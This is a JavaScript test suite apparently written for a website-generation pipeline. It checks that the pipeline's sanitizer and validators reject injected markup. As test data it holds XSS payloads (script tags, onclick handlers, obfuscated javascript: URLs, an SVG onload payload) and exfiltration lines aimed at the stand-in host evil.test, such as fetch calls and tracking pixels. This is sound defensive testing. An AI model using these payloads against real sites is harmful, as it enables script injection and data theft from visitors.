import assert from "node:assert/strict";
import { readFile } from "node:fs/promises";
import path from "node:path";
import { fileURLToPath } from "node:url";
import { fixtures } from "../fixtures/v10_industries.mjs";
import { renderPreview } from "../scripts/arc_contract.mjs";
import { sanitizeStructuredMarkup } from "../scripts/content_sanitizer.mjs";
import { createTestIntakeEvidence } from "./fixtures/intake_evidence.mjs";
import { createTestPaymentLinkEvidence } from "./fixtures/payment_link_evidence.mjs";

const root = path.resolve(path.dirname(fileURLToPath(import.meta.url)), "..");
const template = await readFile(path.join(root, "ARC_MASTER_TEMPLATE.html"), "utf8");
const v11Template = await readFile(path.join(root, "ARC_MASTER_TEMPLATE_V11.html"), "utf8");
const validatorSource = await readFile(path.join(root, "arc_step7_validator.js"), "utf8");
const arc1Source = await readFile(path.join(root, "zapier/arc1_inject.js"), "utf8");
const validate = new Function("inputData", validatorSource);
const AsyncFunction = Object.getPrototypeOf(async function () {}).constructor;
const runArc1 = new AsyncFunction("inputData", arc1Source);
const fixture = fixtures[0];
const paymentLinkUrl = "https://buy.stripe.com/test_00000000000000";
const checkoutBindingSecret = "arc-test-checkout-binding-secret-32-bytes-minimum";
const leadRouteEvidenceSecret = "arc-test-lead-route-evidence-secret-32-bytes-minimum";
const intakeContext = createTestIntakeEvidence();
const paymentLinkContext = createTestPaymentLinkEvidence({ paymentLinkUrl });
const rendererOptions = {
  trustedEventPrefix: fixture.id,
  customerEmail: fixture.customerEmail,
  paymentLinkUrl,
  checkoutBindingSecret,
  leadNotificationEmail: fixture.customerEmail,
  leadRouteEvidenceSecret
};
const arc1Input = content => ({
  template_content: v11Template,
  raw_json: JSON.stringify(content),
  customer_email: fixture.customerEmail,
  private_claim_recipient_email: fixture.customerEmail,
  checkout_binding_secret: checkoutBindingSecret,
  checkout_binding_key_id: "01",
  private_lead_notification_email: fixture.customerEmail,
  lead_route_evidence_secret: leadRouteEvidenceSecret,
  ...paymentLinkContext.privateInputs,
  ...intakeContext.privateInputs
});

const scalarScript = 'Trusted local service<script>document.body.dataset.arcInjected="true"</script>';
const scalarContent = { ...fixture.content, EYEBROW: scalarScript };
const escapedPreview = renderPreview(template, scalarContent, rendererOptions);
assert.doesNotMatch(escapedPreview.html, /<script>document\.body\.dataset\.arcInjected/i);
assert.match(escapedPreview.html, /&lt;script&gt;document\.body\.dataset\.arcInjected=/i);
const scalarValidation = validate({
  html_content: escapedPreview.html,
  raw_json: JSON.stringify(escapedPreview.content),
  file_path: escapedPreview.filePath,
  business_name: fixture.content.BUSINESS_NAME,
  customer_email: fixture.customerEmail,
  trusted_event_prefix: fixture.id,
  preview_url: escapedPreview.previewUrl,
  expected_cta: fixture.content.PRIMARY_CTA_LABEL,
  main_call_to_action: fixture.content.PRIMARY_CTA_LABEL,
  final_placeholder_count: escapedPreview.finalPlaceholderCount,
  template_placeholder_count: escapedPreview.templatePlaceholderCount,
  html_character_count: escapedPreview.htmlCharacterCount,
  template_comment: "ARC Client Master Template v10.0"
});
assert.equal(scalarValidation.validation_pass, true);
assert.equal(scalarValidation.scalar_render_escaping_pass, true);

const escapedArc1 = await runArc1(arc1Input(scalarContent));
const escapedArc1Bundle = JSON.parse(escapedArc1.render_bundle_private);
assert.equal(escapedArc1Bundle.pages.length, 5);
const escapedArc1ApprovalSite = escapedArc1Bundle.pages.map(page => page.approval_html).join("\n");
assert.doesNotMatch(escapedArc1ApprovalSite, /<script>document\.body\.dataset\.arcInjected/i);
assert.match(escapedArc1ApprovalSite, /&lt;script&gt;document\.body\.dataset\.arcInjected=/i);
assert.equal(escapedArc1.trusted_event_prefix, intakeContext.publicFolderPrefix);
const spoofedBrowserIdentity = await runArc1({
  ...arc1Input(scalarContent),
  submission_id: "ffffffff-attacker-controlled",
  received_at: "2099-01-01T00:00:00.000Z",
  form_started_at: "2099-01-01T00:00:00.000Z",
  lead_route_status: "verified"
});
assert.deepEqual(spoofedBrowserIdentity.preview_paths, escapedArc1.preview_paths);
assert.equal(spoofedBrowserIdentity.render_bundle_sha256, escapedArc1.render_bundle_sha256);
assert.equal(spoofedBrowserIdentity.trusted_event_prefix, intakeContext.publicFolderPrefix);
await assert.rejects(
  runArc1({ ...arc1Input(scalarContent), intake_evidence_private: "" }),
  /intake evidence JSON/
);
await assert.rejects(
  runArc1({ ...arc1Input(scalarContent), intake_evidence_hmac_sha256: "0".repeat(64) }),
  /intake evidence HMAC mismatch/
);
await assert.rejects(
  runArc1({ ...arc1Input(scalarContent), intake_claim_status: "PENDING" }),
  /matching atomic private-state claim is required/
);

const rejectedContent = [
  ["style element", { TRUST_LINE_HTML: '<style>.arc-preview-toolbar{display:none!important}</style><span>Trusted</span>' }, /<style> is not allowed/],
  ["style attribute", { TRUST_LINE_HTML: '<span style="position:fixed;inset:0">Trusted</span>' }, /forbidden style attribute/],
  ["event handler", { TRUST_LINE_HTML: '<span onclick="location.href=\'https:\/\/evil.test\'">Trusted</span>' }, /forbidden onclick attribute/],
  ["script element", { TRUST_LINE_HTML: '<script>alert(1)</script><span>Trusted</span>' }, /<script> is not allowed/],
  ["meta redirect", { TRUST_LINE_HTML: '<meta http-equiv="refresh" content="0;url=https:\/\/evil.test"><span>Trusted</span>' }, /<meta> is not allowed/],
  ["unsafe CTA scheme", { PRIMARY_CTA_HREF: "javascript:alert(1)" }, /unsafe URL scheme|unsupported URL/],
  ["entity-obfuscated href", { FOOTER_LINKS_HTML: '<a href="java&#x73;cript:alert(1)">Contact</a>' }, /unsafe URL scheme|unsupported URL/],
  ["backslash form escape", { CONTACT_ACTION_HTML: '<form name="lead" method="POST" data-netlify="true" netlify-honeypot="bot" action="/\\evil.test"><input type="hidden" name="form-name" value="lead"><button type="submit">Send</button></form>' }, /form action must stay same-origin/],
  ["missing success-state route", { CONTACT_ACTION_HTML: fixture.content.CONTACT_ACTION_HTML.replace('action="/?submitted=1"', 'action="/"') }, /exact Netlify form attributes/],
  ["missing privacy disclosure", { CONTACT_ACTION_HTML: fixture.content.CONTACT_ACTION_HTML.replace(/<p class="form-status" role="note">[\s\S]*?<\/p>/, "") }, /exact visible lead privacy disclosure/],
  ["conflicting hidden form route", { CONTACT_ACTION_HTML: fixture.content.CONTACT_ACTION_HTML.replace('value="roofing-lead"', 'value="wrong-lead"') }, /hidden form-name must uniquely match/],
  ["duplicate hidden form route", { CONTACT_ACTION_HTML: fixture.content.CONTACT_ACTION_HTML.replace('<input type="hidden" name="form-name" value="roofing-lead">', '<input type="hidden" name="form-name" value="wrong-lead"><input type="hidden" name="form-name" value="roofing-lead">') }, /duplicate generated form control name/],
  ["mismatched honeypot route", { CONTACT_ACTION_HTML: fixture.content.CONTACT_ACTION_HTML.replace('netlify-honeypot="bot-field"', 'netlify-honeypot="wrong-field"') }, /exact Netlify form attributes/],
  ["DOM-clobbering form control", { CONTACT_ACTION_HTML: fixture.content.CONTACT_ACTION_HTML.replace('name="phone"', 'name="children"') }, /supported lead schema/],
  ["CSS color breakout", { PRIMARY_COLOR: "#000000;} .arc-preview-toolbar{display:none" }, /six-digit hex color/],
  ["protected class", { TRUST_LINE_HTML: '<span class="arc-preview-toolbar">Trusted</span>' }, /generated class is not allowlisted/],
  ["unlabeled lead field", { CONTACT_ACTION_HTML: fixture.content.CONTACT_ACTION_HTML.replace('<label>Name<input type="text" name="name" autocomplete="name" required></label>', '<input type="text" name="name" autocomplete="name" required>') }, /every lead form control requires one visible text label/],
  ["wrong lead autocomplete", { CONTACT_ACTION_HTML: fixture.content.CONTACT_ACTION_HTML.replace('name="email" autocomplete="email"', 'name="email" autocomplete="off"') }, /lead identity controls require exact autocomplete hints/],
  ["thin service section", { SERVICES_HTML: '<article><h3>Roof Replacement</h3><p>A clear and carefully explained roofing service.</p></article>' }, /ARC_CONTENT_QUALITY_INVALID/],
  ["CTA mismatch", { CONTACT_ACTION_HTML: fixture.content.CONTACT_ACTION_HTML.replace('>Request a roof assessment</button>', '>Send request</button>') }, /lead form submit text must exactly match PRIMARY_CTA_LABEL/],
  ["unsupported rating claim", { ABOUT_BODY: fixture.content.ABOUT_BODY + '<p>Rated 4.9/5 by 600 customers across the region.</p>' }, /ARC_CLAIM_EVIDENCE_REQUIRED/],
  ["unfinished copy", { ABOUT_BODY: '<p>Lorem ipsum placeholder copy remains visible even though this paragraph contains enough words to pass a simple word-count check for the section.</p>' }, /placeholder or unfinished copy is visible/]
];
for (const [label, mutation, expression] of rejectedContent) {
  const content = { ...fixture.content, ...mutation };
  assert.throws(
    () => renderPreview(template, content, rendererOptions),
    expression,
    `shared renderer accepted ${label}`
  );
  await assert.rejects(runArc1(arc1Input(content)), expression, `Zapier renderer accepted ${label}`);
}

const approvedHero = "https://uploads.example.test/customer/roof.jpg?token=one";
const approvedMarkup = sanitizeStructuredMarkup(
  "HERO_MEDIA_HTML",
  '<picture><source srcset="https://uploads.example.test/customer/roof.jpg?token=one 720w"><img src="https://uploads.example.test/customer/roof.jpg?token=one" alt="Customer roof"></picture>',
  { heroImageUrl: approvedHero }
);
assert.match(approvedMarkup, /<picture><source srcset="https:\/\/uploads\.example\.test\/customer\/roof\.jpg\?token=one 720w"><img src="https:\/\/uploads\.example\.test\/customer\/roof\.jpg\?token=one" alt="Customer roof"><\/picture>/);
assert.throws(
  () => sanitizeStructuredMarkup(
    "HERO_MEDIA_HTML",
    '<img src="https://uploads.example.test/customer/roof.jpg?token=changed" alt="Unvalidated variant">',
    { heroImageUrl: approvedHero }
  ),
  /image source is not an approved upload/
);
assert.throws(
  () => sanitizeStructuredMarkup(
    "HERO_MEDIA_HTML",
    '<picture><source srcset="https://evil.test/track.jpg 720w"><img src="https://uploads.example.test/customer/roof.jpg" alt="Customer roof"></picture>',
    { heroImageUrl: approvedHero }
  ),
  /image source is not an approved upload/
);

const safeExternalLink = sanitizeStructuredMarkup(
  "FOOTER_LINKS_HTML",
  '<a href="https://example.test/contact" target="_blank">Contact</a>'
);
assert.match(safeExternalLink, /target="_blank" rel="noopener noreferrer"/);
assert.throws(
  () => sanitizeStructuredMarkup(
    "HERO_MEDIA_HTML",
    '<img src="data:image/svg+xml,<svg onload=alert(1)>" alt="Unsafe">',
    { heroImageUrl: approvedHero }
  ),
  /unsafe URL scheme|malformed URL attribute/
);

const ordinary = renderPreview(template, fixture.content, rendererOptions);
assert.match(ordinary.html, /<form name="roofing-lead" method="POST" data-netlify="true"/);
assert.match(ordinary.html, /<article><h3>Roof Replacement<\/h3>/);
assert.doesNotMatch(template, /"(?:name|description|areaServed)"\s*:\s*"\[\[/);

const finalByteEgressAttacks = [
  '<script src="https://evil.test/runtime.js"></script>',
  '<link rel="stylesheet" href="https://evil.test/runtime.css">',
  '<style>.leak{background:url(https://evil.test/pixel.png)}</style>',
  '<script>fetch("https://evil.test/collect")</script>',
  '<script>const node=document.createElement("img");node.src="https://evil.test/pixel.png"</script>',
  '<img src="https://evil.test/unsigned.png" alt="Unsigned">'
];
for (const attack of finalByteEgressAttacks) {
  const attackedTemplate = v11Template.replace("</head>", `${attack}\n</head>`);
  await assert.rejects(
    runArc1({ ...arc1Input(fixture.content), template_content: attackedTemplate }),
    /ARC_REMOTE_DEPENDENCY_INVALID/,
    `Zapier final-byte scanner accepted ${attack}`
  );
}

const validatorFormAttacks = [
  fixture.content.CONTACT_ACTION_HTML.replace('value="roofing-lead"', 'value="wrong-lead"'),
  fixture.content.CONTACT_ACTION_HTML.replace('action="/?submitted=1"', 'action="/"'),
  fixture.content.CONTACT_ACTION_HTML.replace(/<p class="form-status" role="note">[\s\S]*?<\/p>/, ""),
  fixture.content.CONTACT_ACTION_HTML.replace('<input type="hidden" name="form-name" value="roofing-lead">', '<input type="hidden" name="form-name" value="wrong-lead"><input type="hidden" name="form-name" value="roofing-lead">'),
  fixture.content.CONTACT_ACTION_HTML.replace('netlify-honeypot="bot-field"', 'netlify-honeypot="wrong-field"'),
  fixture.content.CONTACT_ACTION_HTML.replace('name="phone"', 'name="children"')
];
for (const attackForm of validatorFormAttacks) {
  const attackContent = { ...ordinary.content, CONTACT_ACTION_HTML: attackForm };
  const attackHtml = ordinary.html.replace(ordinary.content.CONTACT_ACTION_HTML, attackForm);
  assert.throws(
    () => validate({
      html_content: attackHtml,
      raw_json: JSON.stringify(attackContent),
      file_path: ordinary.filePath,
      business_name: fixture.content.BUSINESS_NAME,
      customer_email: fixture.customerEmail,
      trusted_event_prefix: fixture.id,
      preview_url: ordinary.previewUrl,
      expected_cta: fixture.content.PRIMARY_CTA_LABEL,
      main_call_to_action: fixture.content.PRIMARY_CTA_LABEL,
      final_placeholder_count: ordinary.finalPlaceholderCount,
      template_placeholder_count: ordinary.templatePlaceholderCount,
      html_character_count: attackHtml.length,
      template_comment: "ARC Client Master Template v10.0"
    }),
    /form_contract_pass|form_rendered_pass/,
    "Step 7 accepted an adversarial lead form"
  );
}

console.log("ARC content sanitizer contract passed: scalar escaping and typed markup/URL/style allowlists reject active injection in shared and Zapier renderers.");
